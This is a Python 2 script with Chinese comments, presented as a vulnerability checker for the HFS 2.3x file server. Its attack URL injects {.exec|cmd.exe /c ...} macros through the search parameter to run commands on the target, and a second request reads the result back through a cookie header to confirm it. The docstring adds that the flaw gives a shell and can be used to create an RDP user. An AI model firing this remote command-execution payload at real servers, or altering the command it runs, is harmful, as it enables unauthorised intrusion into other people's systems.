#-*- coding:utf-8 -*-

"""
这个脚本是检测是否有HFS漏洞的
当HFS版本处于2.3c机器之前的HFS2.3x版本均可以
当HFS以管理员身份运行时候可以get-shell
原理是创建一个新用户，设置密码和权限，然后你就可以RDP了
"""

#引入依赖的包、库文件
import time
import uuid
import requests
from optparse import OptionParser

#定义扫描类
class HFSScanner:
    """
        HFS扫描类，原理是：
            （1）生成随机字符串，利用命令执行写入远端服务器的HFS.exe目录下的一个文件。
            （2）然后再次利用这里漏洞将文件内容读取出来放在响应报文的头部字段set-cookie中。
            （3）通过判断响应报文该字段是否包含随机字符串来确定是否存在漏洞

    """
    def __init__(self,target,port):
        """创建扫描类实例对象"""
        self.__randomflag = uuid.uuid1() #攻击验证随机标志字符串
        self.__attack_url = r"http://%s:%s/"%(str(target),str(port))+"?search==%00"+r"{.exec|cmd.exe /c del result}"+r"{"+".exec|cmd.exe /c echo>result "+str(self.__randomflag)+"."+"}"
        self.__verify_url = r"http://%s:%s/"%(str(target),str(port))+"?search==%00"+"{.cookie|out|value={.load|result.}.}"


    def __attack(self):
        """发送攻击报文，响应200后反回True"""
        try:
            response = requests.get(self.__attack_url,timeout=120)
        except Exception,reason:
            return False
        if response.status_code != 200:
            return False
        return True

    def __verify(self):
        """发送验证报文，判断set-cookie字段是否为随机标志字符串"""
        try:
            response = requests.get(self.__verify_url,timeout=120)
        except Exception,reason:
            return False
        if response.headers.get("set-cookie").find(str(self.__randomflag)) >= 0:
            return True
        else:
            return False

    def scan(self):
        """扫描函数"""
        print "[+] 开始测试..."
        if self.__attack():
            time.sleep(5)
            if self.__verify():
                return True
        return False

if __name__ == "__main__":
    parser = OptionParser("")
    parser.add_option("-t", dest="target",help="target to scan")
    parser.add_option("-p", dest="port",help="port to scan")
    (options, args) = parser.parse_args()
    if options.target in ["",None]:
        print "[-] 请输入正确的参数!"
        print """
            正确的使用方法：
            #python hfs_vuln_scan.py -t 127.0.0.1 [-p 8080]
        """
        exit(0)
    if options.port in ["",None] or int(options.port) <= 0 and int(options.port) > 65535:
        options.port = "80"
    scanner = HFSScanner(options.target,options.port)
    if scanner.scan():
        print "[*] 目标主机存在漏洞"
    else:
        print "[+] 目标主机不存在漏洞"